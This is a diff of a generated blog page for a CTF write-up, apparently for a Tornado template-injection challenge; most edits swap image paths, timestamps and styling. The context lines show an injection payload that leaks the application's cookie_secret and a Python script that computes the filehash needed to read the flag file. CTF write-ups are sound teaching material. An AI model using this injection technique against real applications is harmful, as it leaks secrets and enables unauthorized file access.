@@ -26,9 +26,9 @@
 <meta property="og:image" content="https://images.gaifagafin.top/202311051129114.png">
 <meta property="og:image" content="https://images.gaifagafin.top/202311051129889.png">
 <meta property="og:image" content="https://images.gaifagafin.top/202311051130450.png">
-<meta property="og:image" content="d:/Typora/md_images/image-20231031195051979-1699154960101-4.png">
+<meta property="og:image" content="https://images.gaifagafin.top/202311061712383.png">
 <meta property="article:published_time" content="2023-10-31T11:17:42.000Z">
-<meta property="article:modified_time" content="2023-11-05T03:56:22.843Z">
+<meta property="article:modified_time" content="2023-11-06T09:13:01.212Z">
 <meta property="article:author" content="gaifagafin">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="攻防世界">
@@ -73,11 +73,15 @@
 
 
 
+  
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"gaifagafin.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"▋","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"gaifagafin.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"▋","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":false,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -336,7 +340,7 @@
 <p>页面返回1，说明存在漏洞，在此处直接注入</p>
 <p>url输入<code>http://61.147.171.105:62044/error?msg=&#123;&#123;handler.settings&#125;&#125;</code></p>
 <p>回显</p>
-<p><img src="D:/Typora/md_images/image-20231031195051979-1699154960101-4.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://images.gaifagafin.top/202311061712383.png" srcset="/img/loading.gif" lazyload></p>
 <p>得到cookie_secret值:<code>4beb94e3-3a69-4960-92ab-f83221330eec</code></p>
 <p>编写脚本获取filehash</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_md5</span>(<span class="hljs-params">content</span>):<br>    md5 = hashlib.md5()<br>    md5.update(content.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-keyword">return</span> md5.hexdigest()<br>filename=<span class="hljs-string">&quot;/fllllllllllllag&quot;</span><br>cookie_secret=<span class="hljs-string">&quot;4beb94e3-3a69-4960-92ab-f83221330eec&quot;</span><br>no_md5_filehash=cookie_secret+get_md5(filename)<br>filehash=get_md5(no_md5_filehash)<br><span class="hljs-built_in">print</span>(filehash)<br></code></pre></td></tr></table></figure>
@@ -362,7 +366,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/CTF-Writeup/" class="category-chain-item">CTF Writeup</a>
+  <a href="/categories/CTF-Writeup/" class="category-chain-item">CTF_Writeup</a>
   
   
 
